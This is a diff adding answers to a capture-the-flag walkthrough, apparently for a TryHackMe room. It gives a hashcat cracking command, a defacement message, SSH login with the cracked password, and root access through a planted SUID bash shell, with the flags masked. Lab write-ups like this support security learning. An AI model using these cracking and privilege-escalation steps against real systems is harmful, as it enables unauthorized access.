@@ -46,3 +46,23 @@ If you are experiencing trouble, google `wireshark follow tcp stream`
 
 	- `hashcat -m 1710 -a 0 HASH_HERE:SALT_HERE /usr/share/wordlists/rockyou.txt`
 	- `**********`
+
+- The attacker defaced the website. What message did they leave as a heading?
+
+	- Go to `http://<TARGET_IP>`
+	- `H4ck3d by CooctusClan`
+
+- Using the information you've found previously, hack your way back in!
+
+	- `ssh james@<TARGET_IP> -p 2222`
+	- Enter the password just cracked.
+	- `cd .. && cat user.txt`
+	- `thm{********************************}`
+
+- What's the root flag?
+
+	- `cd ~`
+	- `ls -alh`
+	- `./.suid-bash -p`
+	- `cat /root/root.txt`
+	- `thm{********************************}`
